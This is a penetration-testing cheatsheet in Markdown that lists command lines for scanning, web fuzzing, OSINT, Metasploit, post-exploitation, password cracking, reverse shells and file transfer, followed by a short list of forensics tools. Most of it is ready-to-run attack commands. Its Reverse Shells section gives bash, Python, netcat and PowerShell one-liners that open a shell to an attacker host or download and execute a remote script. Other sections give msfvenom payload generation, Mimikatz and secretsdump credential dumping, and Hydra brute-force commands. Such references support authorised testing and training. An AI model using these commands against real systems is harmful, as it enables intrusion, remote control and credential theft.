# Security Tools Reference

Comprehensive cheatsheet for security tools used across penetration testing phases: reconnaissance, scanning, exploitation, post-exploitation, forensics, and analysis.

---

## Network Scanning

### Nmap

```bash
# Basic scan with service detection
nmap -sC -sV <TARGET>

# Full port scan
nmap -p- <TARGET>

# UDP scan
nmap -sU --top-ports 1000 <TARGET>

# Aggressive scan
nmap -A -T4 <TARGET>

# Vulnerability scripts
nmap -sV --script "vuln" <TARGET>

# Stealth SYN scan
nmap -sS -T2 <TARGET>

# OS detection
nmap -O <TARGET>

# Script scan with arguments
nmap --script http-form-brute --script-args userdb=users.txt,passdb=pass.txt <TARGET>
```

### Masscan

```bash
# Fast full port scan
masscan -p1-65535 <TARGET> --rate=1000

# Specific ports
masscan -p80,443,8080 <TARGET>/24 --rate=500
```

---

## Web Application Testing

### Gobuster

```bash
# Directory enumeration
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

# DNS subdomain enumeration
gobuster dns -d <DOMAIN> -w /usr/share/wordlists/subdomains.txt

# VHOST enumeration
gobuster vhost -u http://<TARGET> -w /usr/share/wordlists/vhosts.txt
```

### FFuf

```bash
# Directory fuzzing
ffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Parameter fuzzing
ffuf -u http://<TARGET>/page?FUZZ=value -w /usr/share/wordlists/params.txt

# POST data fuzzing
ffuf -u http://<TARGET>/login -X POST -d "user=admin&pass=FUZZ" -w /usr/share/wordlists/rockyou.txt

# Filter by response size
ffuf -u http://<TARGET>/FUZZ -w wordlist.txt -fs 4242

# With extensions
ffuf -u http://<TARGET>/FUZZ -w wordlist.txt -e .php,.txt,.html
```

### Nikto

```bash
# Basic web server scan
nikto -h http://<TARGET>

# With specific port
nikto -h http://<TARGET> -p 8080

# Output to file
nikto -h http://<TARGET> -o results.txt
```

### Nuclei

```bash
# Basic scan with all templates
nuclei -u http://<TARGET>

# Specific severity
nuclei -u http://<TARGET> -severity critical,high

# Specific templates
nuclei -u http://<TARGET> -t cves/

# List scan from file
nuclei -l urls.txt -severity critical
```

### Burp Suite

```bash
# Proxy configuration: 127.0.0.1:8080
# Key features:
# - Proxy: Intercept and modify requests
# - Scanner: Automated vulnerability scanning
# - Repeater: Manual request manipulation
# - Intruder: Automated attacks (brute force, fuzzing)
# - Decoder: Encoding/decoding utilities
```

### SQLmap

```bash
# Basic SQL injection test
sqlmap -u "http://<TARGET>/page?id=1"

# With POST data
sqlmap -u "http://<TARGET>/login" --data="user=admin&pass=test"

# Dump database
sqlmap -u "http://<TARGET>/page?id=1" --dump

# Specific database and table
sqlmap -u "http://<TARGET>/page?id=1" -D database_name -T table_name --dump

# OS shell
sqlmap -u "http://<TARGET>/page?id=1" --os-shell

# Higher risk/level
sqlmap -u "http://<TARGET>/page?id=1" --level=5 --risk=3
```

---

## OSINT and Reconnaissance

### theHarvester

```bash
# Email and subdomain harvesting
theHarvester -d <DOMAIN> -b google,bing,yahoo

# All sources
theHarvester -d <DOMAIN> -b all
```

### Recon-ng

```bash
# Start framework
recon-ng

# Add workspace
workspaces create <name>

# Search modules
marketplace search <keyword>

# Install and use module
marketplace install recon/domains-hosts/hackertarget
modules load recon/domains-hosts/hackertarget
options set SOURCE <DOMAIN>
run
```

### Amass

```bash
# Subdomain enumeration
amass enum -d <DOMAIN>

# Passive only
amass enum -passive -d <DOMAIN>
```

### Subfinder

```bash
# Subdomain discovery
subfinder -d <DOMAIN>

# Output to file
subfinder -d <DOMAIN> -o subdomains.txt
```

---

## Exploitation Frameworks

### Metasploit

```bash
# Start Metasploit
msfconsole

# Search for exploits
search <keyword>

# Use exploit
use exploit/path/to/exploit
show options
set RHOSTS <TARGET>
set LHOST <ATTACKER>
exploit

# Payload generation (MSFVenom)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf

# Multi handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
exploit -j
```

---

## Post-Exploitation

### Impacket

```bash
# PSExec (remote command execution)
impacket-psexec <domain>/<user>:<password>@<TARGET>

# WMIExec
impacket-wmiexec <domain>/<user>:<password>@<TARGET>

# SMBExec
impacket-smbexec <domain>/<user>:<password>@<TARGET>

# SecretsDump (extract hashes)
impacket-secretsdump <domain>/<user>:<password>@<TARGET>

# GetUserSPNs (Kerberoasting)
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC_IP> -request
```

### Mimikatz

```cmd
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest
lsadump::sam
lsadump::dcsync /user:Administrator
```

---

## Password Cracking

### Hashcat

```bash
# Common hash modes
# 0 = MD5, 100 = SHA1, 1000 = NTLM, 1800 = SHA-512(Unix)
# 3200 = bcrypt, 5600 = NetNTLMv2, 12001 = Atlassian

hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m <mode> hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force
hashcat -m <mode> hashes.txt -a 3 ?a?a?a?a?a?a
```

### John the Ripper

```bash
# Basic cracking
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
john --show hashes.txt

# Specific format
john --format=NT hashes.txt --wordlist=wordlist.txt
```

### Hydra

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<TARGET>

# HTTP POST form
hydra -l admin -P wordlist.txt <TARGET> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# FTP
hydra -l admin -P wordlist.txt ftp://<TARGET>

# RDP
hydra -l admin -P wordlist.txt rdp://<TARGET>
```

---

## Reverse Shells

### Linux

```bash
# Bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat
nc -e /bin/sh <ATTACKER_IP> <PORT>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f
```

### Windows

```powershell
# PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/rev.ps1')"

# Netcat (if available)
nc.exe -e cmd.exe <ATTACKER_IP> <PORT>
```

### Listener

```bash
nc -lvnp <PORT>
rlwrap nc -lvnp <PORT>   # With readline support
```

### Shell Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Forensics and Analysis

### Digital Forensics Frameworks
- **Autopsy** - Open-source forensics suite
- **Sleuth Kit** - File system forensic tools
- **Volatility/Volatility3** - Memory analysis
- **Rekall** - Memory forensics

### Memory Forensics
- **LiME** - Linux Memory Extractor
- **AVML** - Azure Linux memory acquisition
- **MemProcFS** - Mount memory as filesystem

### Network Analysis
- **Wireshark** - GUI packet analysis
- **tcpdump** - CLI packet sniffer
- **Suricata** - IDS/NSM engine
- **Zeek** - Network behavioral analysis

### Disk and File Tools
- **Binwalk** - Firmware analysis and extraction
- **ExifTool** - Metadata extraction
- **Foremost** - File carving
- **TestDisk/PhotoRec** - Partition and file recovery

### Malware Analysis
- **YARA** - Signature-based classification
- **PEStudio** - Static PE analysis
- **Ghidra** - Reverse engineering suite
- **Radare2/Cutter** - RE framework and GUI

### Cloud Security Assessment
- **Prowler** - AWS security assessment
- **ScoutSuite** - Multi-cloud security auditing
- **CloudQuery** - SQL for cloud infrastructure

---

## File Transfer

```bash
# Python HTTP server
python3 -m http.server 80

# wget/curl download
wget http://<ATTACKER_IP>/file -O /tmp/file
curl http://<ATTACKER_IP>/file -o /tmp/file

# PowerShell download
powershell -c "Invoke-WebRequest -Uri http://<ATTACKER_IP>/file -OutFile C:\temp\file"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>/file','C:\temp\file')"

# certutil (Windows)
certutil -urlcache -f http://<ATTACKER_IP>/file C:\temp\file

# SCP
scp file user@<TARGET>:/path/
scp user@<TARGET>:/path/file ./

# SMB (Impacket)
impacket-smbserver share /path/to/serve
# On target: copy \\<ATTACKER_IP>\share\file C:\temp\
```
